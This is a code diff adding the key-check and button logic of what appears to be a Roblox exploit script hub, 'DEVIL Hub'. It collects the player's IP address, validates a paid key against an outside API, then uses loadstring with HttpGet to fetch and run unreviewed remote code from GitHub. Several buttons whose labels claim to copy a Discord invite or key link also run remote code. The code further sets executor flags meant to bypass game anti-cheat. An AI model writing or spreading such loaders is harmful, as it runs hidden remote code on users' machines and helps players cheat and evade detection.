+                    "http://api.ipify.org",
+                    "https://ipinfo.io/ip",
+                    "https://v4.ident.me/"
+                }
+
+                local function getCurrentIP()
+                    for _, url in ipairs(ipServices) do
+                        local success, response = pcall(function()
+                            return game:HttpGet(url, {Timeout = 5})
+                        end)
+                        if success and response and response ~= "" then
+                            return response:gsub("%s+", "")
+                        end
+                    end
+                    warn("Could not fetch IP from any service.")
+                    return nil
+                end
+
+                local function compareIPPrefix(ip1, ip2)
+                    if not ip1 or not ip2 then return false end
+                    local prefix1 = ip1:match("^(%d+%.%d+%.%d+)%.")
+                    local prefix2 = ip2:match("^(%d+%.%d+%.%d+)%.")
+                    return prefix1 == prefix2
+                end
+
+                local function validateKey()
+                    local key = KeyCheck.Text:match("^%s*(.-)%s*$")
+                    local ip = getCurrentIP()
+
+                    if not ip then
+                        KeyCheck.Text = "Check connection"
+                        return false
+                    end
+
+                    local url = "https://work.ink/_api/v2/token/isValid/" .. key
+                    local success, response = pcall(function()
+                        return game:HttpGet(url, {Timeout = 10})
+                    end)
+
+                    if not success then
+                        warn("API request failed:", response)
+                        KeyCheck.Text = "Connection failed"
+                        return false
+                    end
+
+                    local jsonSuccess, decoded = pcall(function()
+                        return HttpService:JSONDecode(response)
+                    end)
+
+                    if not jsonSuccess or not decoded then
+                        warn("JSON decode failed. Raw response:", response)
+                        KeyCheck.Text = "Invalid response"
+                        return false
+                    end
+
+                    if not decoded.valid then
+                        KeyCheck.Text = "Invalid or expired key"
+                        return false
+                    end
+
+                    local info = decoded.info
+
+                    if info.byIp and not compareIPPrefix(info.byIp, ip) then
+                        KeyCheck.Text = "IP mismatch — access denied"
+                        warn("Access denied due to IP prefix mismatch. Provided Ip doesnt match Expected Ip")
+                        return false
+                    end
+
+                    local expiresAt = tonumber(info.expiresAfter)
+                    local currentTime = os.time() * 1000
+                    local timeLeft = math.max(0, expiresAt - currentTime)
+
+                    local secondsLeft = math.floor(timeLeft / 1000)
+                    local hours = math.floor(secondsLeft / 3600)
+                    local minutes = math.floor((secondsLeft % 3600) / 60)
+
+                    local expireMessage = "Key valid. Expires in " .. hours .. "h " .. minutes .. "m"
+
+                    print(expireMessage)
+
+                    KeyCheck.Text = expireMessage
+
+                    task.wait(3)
+                    KeyCheck.Text = "Loading..."
+
+                    getgenv().bypassercheck = true
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/gamess", true))()
+                    task.wait(1)
+                    getgenv().bypassercheck = false
+
+                    script.Parent.Parent.Parent:Destroy()
+                    return true
+                end
+
+                validateKey()
+            end)
+
+        end
+    end
+    script.Parent.InputBegan:Connect(onInputBegan)
+end
+coroutine.wrap(WCDO_fake_script)()
+local function JHZLB_fake_script() -- PlayerName.PlayerNameScript 
+    local script = Instance.new('Script', PlayerName)
+
+    script.Parent.Text = game.Players.LocalPlayer.Name
+end
+coroutine.wrap(JHZLB_fake_script)()
+local function MDOANOB_fake_script() -- LicenseType.LicenseCheck 
+    local script = Instance.new('Script', LicenseType)
+
+    if DEVIL_Script_Lisence == true then
+        script.Parent.Text = "Premium"
+    else
+        script.Parent.Text = "Free"
+    end
+end
+coroutine.wrap(MDOANOB_fake_script)()
+local function SZBB_fake_script() -- AvatarPreview.AvatarPreviewScript 
+    local script = Instance.new('Script', AvatarPreview)
+
+    script.Parent.Image = game:GetService("Players"):GetUserThumbnailAsync(game.Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+end
+coroutine.wrap(SZBB_fake_script)()
+
+local function YLZAHAK_fake_script_KeyLess() -- DiscordButton.DiscordButtonScript 
+    local script = Instance.new('Script', KeyResetOn)
+
+    local function onInputBegan(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/refs/heads/main/Last-Resetss"))()
+            script.Parent.Text = "Keyless link copied!"
+            task.wait(1)
+            script.Parent.Text = "Buy keyless for 500!!"
+        end
+    end
+    script.Parent.InputBegan:Connect(onInputBegan)
+end
+coroutine.wrap(YLZAHAK_fake_script_KeyLess)()
+
+
+local function YLZAHAK_fake_script() -- DiscordButton.DiscordButtonScript 
+    local script = Instance.new('Script', DiscordButton)
+
+    local function onInputBegan(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/discord-link"))()
+            script.Parent.Text = "Discord invite copied"
+            task.wait(1)
+            script.Parent.Text = "Copy discord invite"
+        end
+    end
+    script.Parent.InputBegan:Connect(onInputBegan)
+end
+coroutine.wrap(YLZAHAK_fake_script)()
+local function GVMZZ_fake_script() -- KeyButton.KeyButtonScript 
+    local script = Instance.new('Script', KeyButton)
+
+    script.Parent.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/DEVIL-Hub/main/Key"))()
+        script.Parent.Text = "Key address copied"
+        task.wait(1)
+        script.Parent.Text = "Get key"
+    end)
+end
+coroutine.wrap(GVMZZ_fake_script)()
+local function DYWJPFC_fake_script() -- MainFrame.Draggable 
+    local script = Instance.new('LocalScript', MainFrame)
+
+    local UserInputService = game:GetService("UserInputService")
+    
+    local gui = script.Parent
+    
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+    
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+    
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+    
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+    
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+end
+coroutine.wrap(DYWJPFC_fake_script)()
+local function AQZH_fake_script() -- Remove.SubmitScript 
+    local script = Instance.new('Script', Remove)
+
+    --Remove Script
+    
+    local function onInputBegan(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            wait(0.1)
+            for i = 1,10 do
+                getgenv().bypasserkickedcryycryycryyyyy = false
+                wait()
+            end
+            wait(0.01)
+            script.Parent:Destroy()
+        end
+    end
+    script.Parent.InputBegan:Connect(onInputBegan)
+    
+end
+coroutine.wrap(AQZH_fake_script)()
